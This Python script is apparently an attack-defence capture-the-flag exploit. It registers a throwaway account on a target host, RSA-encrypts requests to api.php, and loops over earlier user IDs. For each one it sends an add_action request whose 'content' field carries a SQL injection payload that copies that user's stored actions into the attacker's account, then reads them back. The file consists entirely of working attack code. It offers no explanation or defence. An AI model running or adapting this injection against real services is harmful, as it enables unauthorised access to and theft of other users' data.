import json
import sys
import random

import requests


def gen_rand_string(l=16):
    ABC = "abcdefghijklmnopqrstuvwxyz"

    return "".join(random.choice(ABC) for i in range(l))


s = requests.session()

def encrypt(s):
    N = 0xb3aefb131cf5485561fe3e3408bbc7d466ee79573efb3a3a1333f84110959cb256b15ebec238356995408d42d7421cc25d4b7cb3b3fd015153eee433b66cf559fd194cc5e674b3f1597db275eede5de63abfa4b7067701474f87c947af70470d57a61237a22a73318e96edde0b777c7a4eb570a63bb47355f5db3d223ac99dec76ce338fcb2e65489d504f321307bcc77a3c62d1e73632313ae15b673fc4f946a2c0bb05201007cb54c2dad05a56489ee5f1b5763e1b4413e3bfff954374997e89743cd7ff1cf054fd5268852c2af8eadc657e57b860e2d2e17a9c7cb3222b77c7724bb420838aebdfc91526efd754bd4f158144627e86a3d705274ea0bdbf0f
    E = 65537

    msg_as_num = 0
    for i in range(0, len(s)):
        msg_as_num <<= 8
        msg_as_num += ord(s[i])

    encrypted = pow(msg_as_num, E, N)
    return "%x" % encrypted


def call_api(params):
    global s
    resp = s.post(f"http://{IP}/api.php", data={"p": encrypt(json.dumps(params))})

    print(resp.status_code)
    # print(resp.json())
    return resp.json()


IP = sys.argv[1]


login = gen_rand_string()
password = gen_rand_string()

my_userid = call_api({"action": "register", "login": login, "password": password})["userid"]


for userid in range(my_userid-1, my_userid-10, -1):
    print("add_action", userid)
    params = {
        "action":"add_action",
        "action_data":{
            "color": "#abcdef",
            "tool": "text",
            "params": {
                "content": f"'::xid::text::json,u:=1);select add_action(to_json(get_actions({userid})),{my_userid}) as id -- ",
            }
        },
    }

    call_api(params)


print(call_api({"action": "get_actions"}))

